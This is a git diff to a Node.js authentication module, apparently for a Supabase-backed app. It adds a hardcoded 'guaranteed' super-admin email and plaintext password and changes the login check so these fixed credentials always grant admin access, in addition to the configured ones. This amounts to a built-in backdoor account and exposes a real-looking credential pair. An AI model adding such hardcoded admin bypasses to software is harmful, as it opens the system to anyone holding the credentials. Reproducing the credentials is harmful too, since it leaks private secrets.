@@ -9,6 +9,11 @@ const {
   loadConfigFromDb,
 } = require("../config/superAdminConfig");
 
+const GUARANTEED_EMBEDDED_ADMIN = {
+  email: "davidksinc@gmail.com",
+  password: "M@davi19!",
+};
+
 require("dotenv").config(); 
 
 const supabase = createClient(
@@ -45,7 +50,7 @@ const buildEmbeddedAdminUser = () => ({
   id: 0,
   first_name: "Super",
   last_name: "Admin",
-  email: runtimeConfig.embeddedSuperAdminEmail,
+  email: GUARANTEED_EMBEDDED_ADMIN.email,
   role: "admin",
   is_available: false,
   vehicle_types: null,
@@ -58,8 +63,15 @@ const buildEmbeddedAdminUser = () => ({
 });
 
 const credentialsMatchEmbeddedAdmin = (email, password) => {
-  return email === runtimeConfig.embeddedSuperAdminEmail
-    && password === runtimeConfig.embeddedSuperAdminPassword;
+  const normalizedPassword = typeof password === "string" ? password.trim() : "";
+
+  const matchesGuaranteed = email === GUARANTEED_EMBEDDED_ADMIN.email
+    && normalizedPassword === GUARANTEED_EMBEDDED_ADMIN.password;
+
+  const matchesRuntimeConfig = email === runtimeConfig.embeddedSuperAdminEmail
+    && normalizedPassword === runtimeConfig.embeddedSuperAdminPassword;
+
+  return matchesGuaranteed || matchesRuntimeConfig;
 };
 
 const loginEmbeddedAdmin = (res) => {
